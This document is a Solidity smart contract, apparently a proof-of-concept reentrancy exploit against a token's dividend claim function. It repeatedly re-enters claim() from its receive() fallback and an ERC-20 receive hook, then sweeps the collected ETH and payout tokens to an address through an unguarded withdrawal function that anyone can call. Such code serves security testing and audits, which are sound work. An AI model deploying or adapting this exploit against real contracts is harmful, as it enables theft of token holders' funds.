contract ReentrancyAttack2 {
    IEthBurn public token;
    IDividendTracker public dividendTracker;
    address public attacker;
    uint256 public reentrancyCount;

    constructor(address _token) {
        token = IEthBurn(_token);
        dividendTracker = IDividendTracker(token.dividendTracker());
        attacker = msg.sender;
    }

    function executeAttack() external {
        // Start attack
        token.claim();
    }

    receive() external payable {
        reentrancyCount++;

        // Try to reenter if we haven't done too many times
        if (reentrancyCount < 5 && msg.value > 0) {
            // Reenter claim
            token.claim();
        }
    }

    // Fallback for token transfers if payout is in tokens
    function onERC20Received(address, address, uint256, bytes memory) external returns (bytes4) {
        // If we receive tokens, we could reenter here too
        if (reentrancyCount < 5) {
            reentrancyCount++;
            token.claim();
        }
        return this.onERC20Received.selector;
    }

    function withdrawToAttacker(address _attacker) external {
        // Withdraw ETH
        payable(_attacker).transfer(address(this).balance);

        // Withdraw any tokens (if payout is in tokens)
        IERC20 payoutToken = IERC20(dividendTracker.getPayoutToken());
        uint256 tokenBalance = payoutToken.balanceOf(address(this));
        if (tokenBalance > 0) {
            payoutToken.transfer(_attacker, tokenBalance);
        }
    }
}

